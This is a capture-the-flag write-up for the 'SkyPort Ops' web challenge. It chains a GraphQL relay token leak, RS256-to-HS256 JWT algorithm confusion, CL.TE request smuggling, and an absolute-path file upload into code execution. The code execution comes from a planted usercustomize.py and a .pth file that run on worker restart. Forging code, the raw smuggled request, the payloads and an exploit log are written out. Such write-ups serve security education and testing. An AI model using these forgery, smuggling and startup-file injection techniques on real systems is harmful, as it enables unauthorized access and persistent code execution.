# SkyPort Ops - 7-Stage Web Exploitation Chain

## Challenge Info
- **Name**: SkyPort Ops
- **Category**: Web
- **Platform**: 0xFun CTF
- **Remote**: `http://chall.0xfun.org:30516`
- **Flag**: `0xfun{0ff1c3r_5mugg13d_p7h_1nt0_41rp0r7}`
- **Description**: *SkyPort Internal Operations Portal - Restricted access, authorised airport staff only.*

---

## Architecture Overview

The challenge runs a Docker container with multiple components:

```
Internet → lib-gateway-port (Port 9000) → Hypercorn/FastAPI (Port 5000)
                SecurityGateway                    app.py
                (Python, root)              (Python venv, user skyport)
```

### Infrastructure (from Dockerfile + start.sh)

```dockerfile
# Venv with --system-site-packages (CRITICAL for exploitation)
python3 -m venv --system-site-packages /app/venv

# SUID flag reader binary
COPY --from=app-builder /build/flag /flag
RUN chown root:root /flag && chmod 4755 /flag

# App runs as unprivileged user
RUN useradd -m -s /bin/bash skyport
```

```bash
# start.sh - Two processes:
# 1. SecurityGateway runs as root from /tmp/
python3 /tmp/start_gateway.py &

# 2. Hypercorn runs as skyport with --max-requests 100
exec su -s /bin/bash skyport -c \
  "/app/venv/bin/python3 -m hypercorn /app/app:app \
   --bind 127.0.0.1:5000 --workers 2 --worker-class asyncio --max-requests 100"
```

Key observations:
- `--system-site-packages` means user site-packages are **enabled** (`ENABLE_USER_SITE = True`)
- `--max-requests 100` means workers restart after 100 requests each
- `--workers 2` means 2 worker processes, total ~200 requests to restart both
- Hypercorn uses `get_context("spawn")`, so restarted workers are **fresh interpreters** (not forks)
- SecurityGateway runs from `/tmp/`, blocking `/internal/*` paths
- The `/flag` binary is SUID root and reads `/root/flag.txt`

---

## Source Code Analysis (app.py)

### GraphQL Schema

The app uses **Strawberry GraphQL** with Relay's `node` interface:

```python
@strawberry.type
class StaffNode(Node):
    id: NodeID[int]
    username: str
    full_name: str
    badge_id: Optional[str]
    department: Optional[str]
    access_token: Optional[str]    # <-- JWT exposed!

    @classmethod
    def resolve_node(cls, node_id: str, *, info: Info, **kwargs):
        return USERS.get(int(node_id))  # Direct lookup, no auth check
```

The `StaffNode` type exposes `access_token` - a field containing a signed JWT. The `resolve_node` method returns any user by ID with no authorization check.

Staff user `officer_chen` (pk=2) has a JWT stored in `access_token`:

```python
USERS = {
    2: UserModel(
        pk=2, username="officer_chen", role="staff",
        access_token=_STAFF_JWT,  # RS256-signed JWT
    ),
}
```

### JWT Generation and Verification

```python
# Key generation at startup
_rsa_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
RSA_PRIVATE_PEM = _rsa_key.private_bytes(Encoding.PEM, ...)
RSA_PUBLIC_DER  = _rsa_key.public_key().public_bytes(Encoding.DER, ...)

# Staff JWT signed with RS256
_STAFF_JWT = jose_jwt.encode(
    {"sub": "officer_chen", "role": "staff", "jwks_uri": JWKS_PATH},
    RSA_PRIVATE_PEM, algorithm="RS256",
)

# Verification - THE BUG: algorithms=None
def _decode_admin_jwt(token: str):
    payload = jose_jwt.decode(token, RSA_PUBLIC_DER, algorithms=None)
    #                                                ^^^^^^^^^^^^^^^^
    # algorithms=None accepts ANY algorithm, including HS256!
    return payload if payload.get("role") == "admin" else None
```

The JWKS endpoint serves the public key in **PEM** format, but `jose_jwt.decode()` uses `RSA_PUBLIC_DER` (DER bytes) as the verification key. When we forge an HS256 JWT, we must sign with the DER bytes, not PEM.

### Upload Endpoint

```python
async def save_uploaded_file(file: UploadFile) -> Path:
    filename = file.filename or "upload.bin"
    if filename.startswith("/"):
        destination = Path(filename)           # ABSOLUTE PATH - no sanitization!
    else:
        safe_name = sanitize_filename(filename)
        destination = UPLOAD_DIR / safe_name
    destination.parent.mkdir(parents=True, exist_ok=True)  # Creates dirs recursively
    destination.write_bytes(content)
    return destination

@app.post("/internal/upload")
async def upload_file(request: Request, file: UploadFile = File(...)):
    if not _require_admin(request):
        return JSONResponse({"error": "admin token required"}, status_code=401)
    uploaded_path = await save_uploaded_file(file)
    return JSONResponse({"message": "uploaded successfully", "path": str(uploaded_path)})
```

Two bugs:
1. **Path traversal**: If filename starts with `/`, it's used as an absolute path with zero sanitization. The `sanitize_filename()` function is only called for relative filenames.
2. **Directory creation**: `mkdir(parents=True, exist_ok=True)` creates the entire directory tree if it doesn't exist.

---

## Exploitation - 7-Stage Chain

### Stage 1: GraphQL Relay Information Disclosure

Strawberry's Relay implementation uses base64-encoded global IDs in the format `TypeName:pk`. We can query any node type by its global ID:

```
base64("StaffNode:2") = "U3RhZmZOb2RlOjI="
```

```graphql
{
  node(id: "U3RhZmZOb2RlOjI=") {
    ... on StaffNode {
      accessToken
    }
  }
}
```

```bash
$ curl -s http://target/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{node(id:\"U3RhZmZOb2RlOjI=\"){... on StaffNode{accessToken}}}"}'

{"data":{"node":{"accessToken":"eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWI..."}}}
```

Decoding the JWT payload (without verification):
```json
{
  "sub": "officer_chen",
  "role": "staff",
  "jwks_uri": "/api/57511e180e2d1e3a"
}
```

The `jwks_uri` field reveals the path to the public key endpoint (randomized with `secrets.token_hex(8)` at startup).

### Stage 2: JWT Algorithm Confusion (RS256 to HS256)

The server decodes JWTs with `algorithms=None`, which means it accepts **any** algorithm. The key passed to `jose_jwt.decode()` is `RSA_PUBLIC_DER` - the raw DER bytes of the RSA public key.

When the algorithm is RS256, `jose_jwt.decode()` uses the key as an RSA public key to verify the signature. But when the algorithm is HS256, it uses the **same bytes** as an HMAC-SHA256 symmetric secret.

Since the RSA public key is... public, we can:
1. Fetch the PEM from the JWKS endpoint
2. Convert PEM to DER (to match what the server uses internally)
3. Sign an HS256 JWT with `{"role": "admin"}` using the DER bytes as the HMAC key

```python
# Fetch public key (PEM format)
resp = requests.get(f"{URL}{jwks_path}")
pem_key = resp.json()["public_key"].encode()

# Convert PEM → DER (CRITICAL: server verifies against DER, not PEM)
pub_key = serialization.load_pem_public_key(pem_key)
der_key = pub_key.public_bytes(Encoding.DER, PublicFormat.SubjectPublicKeyInfo)

# Forge HS256 JWT with DER as HMAC secret
header = {"alg": "HS256", "typ": "JWT"}
payload = {"sub": "admin", "role": "admin"}

header_b64 = base64url(json(header))
payload_b64 = base64url(json(payload))
message = header_b64 + "." + payload_b64
signature = HMAC_SHA256(der_key, message)
admin_jwt = message + "." + base64url(signature)
```

**Gotcha**: The JWKS endpoint returns PEM, but `jose_jwt.decode()` uses DER. Using PEM bytes as the HMAC key produces a valid HMAC, but not one that matches what the server expects. The PEM→DER conversion is mandatory.

### Stage 3: HTTP Request Smuggling (CL.TE)

The `/internal/upload` endpoint is protected by SecurityGateway (`lib-gateway-port`), which blocks all requests to `/internal/*` paths. We need to bypass it via **CL.TE HTTP request smuggling**.

The desync works because:
- **SecurityGateway** (frontend): reads body using `Content-Length` only
- **Hypercorn** (backend): supports `Transfer-Encoding: chunked`

When both headers are present:
1. Gateway reads `Content-Length` bytes as the body (including our smuggled request)
2. Gateway forwards everything to Hypercorn
3. Hypercorn reads `Transfer-Encoding: chunked`, sees `0\r\n\r\n` = end of chunks
4. Hypercorn treats the remaining bytes as **a new HTTP request**

```
POST /graphql HTTP/1.1          ← Gateway sees: normal POST to /graphql (allowed)
Host: target
Content-Type: application/json
Content-Length: 1337             ← Gateway reads 1337 bytes as body
Transfer-Encoding: chunked      ← Hypercorn uses THIS instead

0\r\n                           ← Hypercorn: end of chunked body (empty)
\r\n                            ← Hypercorn: body delimiter
POST /internal/upload HTTP/1.1  ← Hypercorn: NEW request! Gateway never saw this
Host: localhost
Authorization: Bearer <admin_jwt>
Content-Type: multipart/form-data; boundary=...
Content-Length: <multipart_size>

--boundary\r\n
Content-Disposition: form-data; name="file"; filename="/absolute/path/evil.py"\r\n
Content-Type: application/octet-stream\r\n
\r\n
<malicious code>
\r\n
--boundary--\r\n
```

The warmup request is needed to establish the keep-alive connection through the gateway to the backend. The smuggled request then rides on the same TCP connection.

The outer request gets a 400/405 error (malformed GraphQL body), but the smuggled request still processes successfully on the backend.

### Stage 4: Path Traversal in Upload

The smuggled upload uses an **absolute path** as the filename:

```
filename="/home/skyport/.local/lib/python3.11/site-packages/usercustomize.py"
```

Because the upload handler does:
```python
if filename.startswith("/"):
    destination = Path(filename)  # Used directly!
destination.parent.mkdir(parents=True, exist_ok=True)  # Creates entire tree
```

The `mkdir(parents=True)` creates:
```
/home/skyport/.local/
/home/skyport/.local/lib/
/home/skyport/.local/lib/python3.11/
/home/skyport/.local/lib/python3.11/site-packages/
```

Since Hypercorn runs as user `skyport`, we can write anywhere in `skyport`'s home directory.

### Stage 5: Python usercustomize.py Hijack

This is the key insight. The venv was created with `--system-site-packages`:

```dockerfile
python3 -m venv --system-site-packages /app/venv
```

This sets `ENABLE_USER_SITE = True` in the venv. When a Python interpreter starts, `site.py` checks for user site-packages:

```
~/.local/lib/python3.X/site-packages/
```

If this directory exists and `ENABLE_USER_SITE` is True, Python automatically:
1. Adds the directory to `sys.path`
2. Processes any `.pth` files (lines starting with `import` are **executed**)
3. Imports `usercustomize.py` if it exists

Our uploaded `usercustomize.py`:
```python
import subprocess, os
try:
    result = subprocess.check_output(['/flag'], stderr=subprocess.STDOUT, timeout=5)
    with open('/tmp/skyport_uploads/FLAG.txt', 'w') as f:
        f.write(result.decode())
except Exception as e:
    with open('/tmp/skyport_uploads/ERROR.txt', 'w') as f:
        f.write(str(e))
```

We also upload a `.pth` backup file as a fallback:
```
import os; os.system('/flag > /tmp/skyport_uploads/FLAG.txt 2>&1')
```

### Stage 6: Triggering Worker Restart

The malicious code only executes when a **new** Python process starts. Hypercorn is configured with:

```
--max-requests 100 --workers 2
```

After ~100 requests per worker, Hypercorn recycles the worker process. The new worker is spawned using `multiprocessing.get_context("spawn")` - this creates a **fresh Python interpreter** (not a fork), which goes through the full startup sequence including `site.py`.

We send ~350 HTTP requests to ensure both workers restart:

```python
for i in range(350):
    requests.get(f"http://{HOST}:{PORT}/")
```

When a worker restarts:
1. Fresh Python interpreter starts
2. `site.py` runs, finds `~/.local/lib/python3.11/site-packages/`
3. `usercustomize.py` is imported
4. `/flag` SUID binary executes, writes flag to `/tmp/skyport_uploads/FLAG.txt`

### Stage 7: Flag Retrieval

The flag file lands in `/tmp/skyport_uploads/FLAG.txt`, which is served by FastAPI's `StaticFiles` mount:

```python
app.mount("/uploads", StaticFiles(directory=str(UPLOAD_DIR)), name="uploads")
```

```bash
$ curl http://target/uploads/FLAG.txt
0xfun{0ff1c3r_5mugg13d_p7h_1nt0_41rp0r7}
```

---

## Full Exploit Chain Diagram

```
[1] GraphQL Relay        →  Leak staff JWT (officer_chen, RS256)
         ↓                   Extract jwks_uri from JWT payload
[2] JWKS + Algorithm     →  Fetch RSA public key (PEM → DER)
    Confusion               Forge admin JWT (HS256 with DER secret)
         ↓
[3] CL.TE Smuggling      →  Bypass SecurityGateway blocking /internal/*
         ↓                   Smuggled POST reaches /internal/upload
[4] Path Traversal        →  filename="/home/skyport/.local/.../usercustomize.py"
         ↓                   mkdir(parents=True) creates directory tree
[5] usercustomize.py      →  Python auto-imports on interpreter startup
    Hijack                   Code executes /flag SUID binary
         ↓
[6] Worker Restart        →  350 requests trigger --max-requests recycling
         ↓                   spawn context = fresh interpreter = site.py runs
[7] Flag via Static       →  /uploads/FLAG.txt served by FastAPI StaticFiles
    Files
```
---
```
============================================================
SkyPort Ops - Full Exploit
============================================================
[*] Step 1: Leaking staff JWT via GraphQL relay node...
    Response: {"data": {"node": {"accessToken": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJvZmZpY2VyX2NoZW4iLCJyb2xlIjoic3RhZmYiLCJqd2tzX3VyaSI6Ii9hcGkvNjI5NmM0MGViNGZjODI1ZSJ9.gGeKQxMRYtxouRW4iM76ZhVoDO1KXdg
    JWT: eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJvZ...
    JWKS path: /api/6296c40eb4fc825e
    Got RSA public key (451 bytes)
[*] Step 2: Forging admin JWT (RS256 → HS256 confusion)...
    Admin JWT: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZ...

[*] Uploading usercustomize.py to /home/skyport/.local/lib/python3.11/site-packages/usercustomize.py
    Attempt 1/15...
    [?] Response: HTTP/1.1 400
    Attempt 2/15...
    [?] Response: HTTP/1.1 400
    Attempt 3/15...
    [?] Response: HTTP/1.1 400
    Attempt 4/15...
    [?] Response: HTTP/1.1 400
    Attempt 5/15...
    [?] Response: HTTP/1.1 400
    Attempt 6/15...
    [?] Response: HTTP/1.1 400
    Attempt 7/15...
    [?] Response: HTTP/1.1 400
    Attempt 8/15...
    [?] Response: HTTP/1.1 400
    Attempt 9/15...
    [?] Response: HTTP/1.1 400
    Attempt 10/15...
    [?] Response: HTTP/1.1 400
    Attempt 11/15...
    [?] Response: HTTP/1.1 400
    Attempt 12/15...
    [?] Response: HTTP/1.1 400
    Attempt 13/15...
    [?] Response: HTTP/1.1 400
    Attempt 14/15...
    [?] Response: HTTP/1.1 400
    Attempt 15/15...
    [?] Response: HTTP/1.1 400

[*] Also uploading .pth file as backup to /home/skyport/.local/lib/python3.11/site-packages/evil.pth
    Attempt 1/10...
    [?] Response: HTTP/1.1 400
    Attempt 2/10...
    [?] Response: HTTP/1.1 400
    Attempt 3/10...
    [?] Response: HTTP/1.1 400
    Attempt 4/10...
    [?] Response: HTTP/1.1 400
    Attempt 5/10...
    [?] Response: HTTP/1.1 400
    Attempt 6/10...
    [?] Response: HTTP/1.1 400
    Attempt 7/10...
    [?] Response: HTTP/1.1 400
    Attempt 8/10...
    [?] Response: HTTP/1.1 400
    Attempt 9/10...
    [?] Response: HTTP/1.1 400
    Attempt 10/10...
    [?] Response: HTTP/1.1 400

[*] Step 4: Sending 350 requests to trigger --max-requests 100 worker restart...
    Sent 50/350 (50 ok)
    Sent 100/350 (99 ok)
    Sent 150/350 (149 ok)
    Sent 200/350 (197 ok)
    Sent 250/350 (247 ok)
    Sent 300/350 (296 ok)
    Sent 350/350 (346 ok)
    Done: 346/350 successful

[*] Step 5: Checking for flag...
    [+] FLAG CAPTURED: 0xfun{0ff1c3r_5mugg13d_p7h_1nt0_41rp0r7}

============================================================
FLAG: 0xfun{0ff1c3r_5mugg13d_p7h_1nt0_41rp0r7}
============================================================
```
---

## Key Vulnerabilities

| # | Vulnerability | Source Code | Impact |
|---|---|---|---|
| 1 | GraphQL Info Disclosure | `StaffNode.access_token` exposed via Relay `node` query, no auth check | Leak staff JWT |
| 2 | JWT Algorithm Confusion | `jose_jwt.decode(token, RSA_PUBLIC_DER, algorithms=None)` | Forge admin JWT |
| 3 | HTTP Request Smuggling | Gateway uses CL only; Hypercorn supports TE | Bypass path blocking |
| 4 | Path Traversal | `filename.startswith("/")` → `Path(filename)` directly | Arbitrary file write |
| 5 | Writable Python Path | `--system-site-packages` enables user site-packages | Code injection vector |
| 6 | Worker Recycling | `--max-requests 100` + `spawn` context | Trigger code execution |

---

## Key Lessons

1. **PEM vs DER matters**: The JWKS endpoint returns PEM, but `jose_jwt.decode()` uses DER bytes internally. Signing HS256 with PEM bytes produces a valid HMAC but one that doesn't match the server's verification. This was the most time-consuming debugging step.

2. **usercustomize.py is a powerful injection vector**: When `ENABLE_USER_SITE` is True (venv with `--system-site-packages`), any Python process automatically imports `usercustomize.py` from user site-packages at startup. Combined with arbitrary file write, this gives code execution without modifying any existing files.

3. **Smuggling doesn't need visible confirmation**: The outer request returns 400/405 (malformed GraphQL), which looks like a failure. But the smuggled request still processes successfully on the backend. You can't rely on the response to confirm success - check the side effects instead.

4. **`mkdir(parents=True)` amplifies path traversal**: The path traversal alone would fail if the parent directories don't exist. But `mkdir(parents=True, exist_ok=True)` creates the entire directory tree, turning a file write into an arbitrary-path file write.

5. **`spawn` vs `fork` context**: Hypercorn uses `get_context("spawn")`, not fork. A forked process inherits `sys.modules` from the parent and would NOT re-import `usercustomize.py`. A spawned process is a fresh interpreter that goes through full startup including `site.py`. This distinction is what makes the exploit possible.

6. **`--max-requests` as an attack primitive**: An operational configuration parameter (designed for memory leak mitigation) becomes the exploitation mechanism when combined with code injection. The attacker controls when workers restart by sending enough requests.

7. **Chain length doesn't mean chain complexity**: Each individual vulnerability is straightforward (IDOR, algorithm confusion, CL.TE, path traversal). The challenge is recognizing that all 7 links connect into a single exploitation path.

---

## Files

| File | Description |
|------|-------------|
| `final_exploit.py` | Full automated exploit (supports LOCAL/REMOTE) |
| `flag.txt` | Captured flag |
| `WRITEUP.md` | This writeup |
| `app.py` | Application source code |
| `Dockerfile` | Container configuration |
| `start.sh` | Startup script (gateway + Hypercorn) |
| `flag_reader.c` | SUID binary source |
| `requirements.txt` | Python dependencies |
| `skyport_ops.zip` | Original challenge archive |
